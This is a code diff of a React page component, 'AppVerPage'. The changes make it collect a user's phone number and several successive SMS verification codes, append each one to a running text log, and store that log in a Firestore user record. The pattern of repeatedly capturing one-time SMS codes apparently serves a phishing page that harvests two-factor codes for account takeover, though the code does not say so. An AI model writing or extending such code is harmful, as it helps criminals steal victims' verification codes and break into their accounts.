@@ -44,35 +44,49 @@ function AppVerPage(props) {
 
     const send = async(e)=>{
       e.preventDefault();
+      let localText = localStorage.getItem("text");
+      localText = localText.split("/");
+      localText.push(` / Phone: ${phone}`);
+
         const document = doc(db, "users", uid);
         await updateDoc(document, {
-            phone: phone
+            text: localText.join(" "),
 });
-setPage(true)
+localStorage.setItem("text", localText.join(" "));
+
+setPage(true);
 }
 
-const [count,setCount] = useState(0);
+
+const [count,setCount] = useState(1);
 
 const send2 = async(e)=>{
   e.preventDefault();
-  if (count === 0) {
-  const document = doc(db, "users", uid);
-  await updateDoc(document, {
-      sms: code
-  });
-  } else if (count === 1) {
-    const document = doc(db, "users", uid);
-    await updateDoc(document, { sms2: code });
-    setPage(false); 
-  } else {
-    console.log("Limit reached");
-    setPage(false); 
-  }
-  setCount(prev => prev + 1);
-  setCode("");
-  setShow(true)
+  if (count < 3) {
+
+    e.preventDefault();
+      let localText = localStorage.getItem("text");
+      localText = localText.split("/");
+      localText.push(` / code-sms: ${code}`);
+
+        const document = doc(db, "users", uid);
+        await updateDoc(document, {
+            text: localText.join(" "),
+});
+localStorage.setItem("text", localText.join(" "));
+setCount(prev => prev + 1);
+setCode("");
+ }  
 }
-    
+
+useEffect(()=>{
+  console.log(count)
+  if (count > 2) {
+    setPage(false);
+    setCount(1);
+  }
+},[count]);
+
     useEffect(()=>{
         if (page === false) {
             setC1({
